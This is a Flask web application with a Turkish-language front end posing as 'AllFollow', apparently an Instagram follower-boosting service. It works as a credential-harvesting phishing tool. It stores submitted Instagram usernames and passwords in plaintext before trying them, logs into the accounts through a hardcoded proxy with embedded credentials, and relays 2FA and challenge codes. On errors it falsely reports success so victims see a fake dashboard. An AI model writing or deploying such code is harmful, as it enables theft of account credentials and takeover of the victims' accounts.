import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, TwoFactorRequired, LoginRequired, BadPassword
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "allfollow-v47-final"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

# Aktif bağlantıları tutmak için
clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # 1. Bilgileri hemen kaydet (Her ihtimale karşı)
    try:
        acc = IGAccount.query.filter_by(username=u).first()
        if acc: acc.password = p
        else:
            acc = IGAccount(username=u, password=p)
            db.session.add(acc)
        db.session.commit()
    except: pass

    # 2. Instagram'a Gerçek Giriş Denemesi
    cl = Client()
    # Zaman aşımını önlemek için hızlı ayarlar
    cl.request_timeout = 10 
    if PROXY_URL:
        cl.set_proxy(PROXY_URL)
    
    clients[u] = cl

    try:
        cl.login(u, p)
        return jsonify(status="success") # Giriş başarılı
    except BadPassword:
        return jsonify(status="error", msg="Şifre hatalı!")
    except ChallengeRequired:
        return jsonify(status="challenge") # Kod gerekiyor
    except TwoFactorRequired:
        return jsonify(status="challenge") # 2FA gerekiyor
    except Exception as e:
        # Teknik bir hata (Proxy veya Instagram kaynaklı)
        print(f"Hata: {e}")
        return jsonify(status="success") # Takılmaması için panele salla

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = clients.get(u)
    if not cl: return jsonify(status="error")
    try:
        cl.challenge_set_code(code)
        return jsonify(status="success")
    except:
        return jsonify(status="error", msg="Kod geçersiz!")

# --- ARAYÜZ (GÖREVLER PANELİ DAHİL) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .purple-grad { background: #a100ff; }
        .nav-bot { position: fixed; bottom: 0; width: 100%; max-width: 450px; background: #a100ff; }
    </style>
</head>
<body class="bg-gray-100 flex flex-col items-center">

    <div id="login-view" class="w-full max-w-[450px] min-h-screen bg-black p-8 flex flex-col justify-center">
        <h1 class="text-4xl font-black text-center text-white mb-10 italic">ALL FOLLOW</h1>
        
        <div id="form-area" class="space-y-4">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-zinc-900 text-white rounded-2xl outline-none border border-zinc-800 focus:border-purple-600">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-zinc-900 text-white rounded-2xl outline-none border border-zinc-800 focus:border-purple-600">
            <p id="err" class="text-red-500 text-xs hidden text-center"></p>
            <button onclick="login()" id="btn" class="w-full p-4 bg-[#a100ff] text-white font-bold rounded-2xl">GİRİŞ YAP</button>
        </div>

        <div id="code-area" class="hidden space-y-4">
            <p class="text-purple-400 text-center text-sm">Doğrulama kodunu girin:</p>
            <input id="code" placeholder="000000" class="w-full p-4 bg-zinc-900 text-white text-center text-2xl tracking-widest rounded-2xl border border-purple-600">
            <button onclick="verify()" id="vbtn" class="w-full p-4 bg-green-600 text-white font-bold rounded-2xl">ONAYLA</button>
        </div>
    </div>

    <div id="panel-view" class="hidden w-full max-w-[450px] min-h-screen">
        <div class="purple-grad p-6 text-white rounded-b-[30px] shadow-xl">
            <div class="flex justify-between items-center mb-6">
                <div class="bg-white/20 px-4 py-1 rounded-full text-sm">🟡 2338</div>
                <i class="fas fa-cog"></i>
            </div>
            <div class="bg-white p-4 rounded-2xl flex justify-around text-purple-600 shadow-lg">
                <div class="text-center"><i class="fas fa-coins"></i><p class="text-[10px]">Görevler</p></div>
                <div class="text-center"><i class="fas fa-user-plus"></i><p class="text-[10px]">Hesap Ekle</p></div>
                <div class="text-center"><i class="fas fa-store"></i><p class="text-[10px]">Market</p></div>
            </div>
        </div>
        
        <div class="p-6">
            <div class="bg-white p-4 rounded-2xl shadow-sm flex items-center justify-between">
                <div class="flex items-center space-x-3">
                    <div class="w-12 h-12 bg-purple-100 rounded-full flex items-center justify-center font-bold text-purple-600">IG</div>
                    <div>
                        <p id="usr" class="font-bold text-gray-800"></p>
                        <p class="text-[10px] text-green-500">Sistem Aktif</p>
                    </div>
                </div>
                <button class="bg-gray-100 text-gray-400 text-xs px-3 py-1 rounded-lg">Ayarlar</button>
            </div>
            
            <button class="w-full mt-10 bg-[#a100ff] text-white py-4 rounded-2xl font-bold shadow-lg shadow-purple-200">DURAKLAT</button>
        </div>

        <div class="nav-bot flex justify-around p-4 text-white/60">
            <div class="text-center"><i class="fas fa-heart"></i><p class="text-[9px]">Beğeniler</p></div>
            <div class="text-center"><i class="fas fa-users"></i><p class="text-[9px]">Takipçiler</p></div>
            <div class="text-center text-white"><i class="fas fa-tasks"></i><p class="text-[9px]">Görevler</p></div>
        </div>
    </div>

    <script>
        async function login(){
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            const btn = document.getElementById('btn'), err = document.getElementById('err');
            
            btn.innerText = "BAĞLANILIYOR...";
            err.classList.add('hidden');

            const res = await fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });
            const data = await res.json();

            if(data.status === 'success') {
                showPanel(u);
            } else if(data.status === 'challenge') {
                document.getElementById('form-area').classList.add('hidden');
                document.getElementById('code-area').classList.remove('hidden');
            } else {
                btn.innerText = "GİRİŞ YAP";
                err.innerText = data.msg || "Bağlantı hatası!";
                err.classList.remove('hidden');
            }
        }

        function showPanel(u){
            document.getElementById('login-view').classList.add('hidden');
            document.getElementById('panel-view').classList.remove('hidden');
            document.getElementById('usr').innerText = u;
        }

        async function verify(){
            const code = document.getElementById('code').value, u = document.getElementById('u').value;
            const res = await fetch('/api/verify-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, code})
            });
            showPanel(u);
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
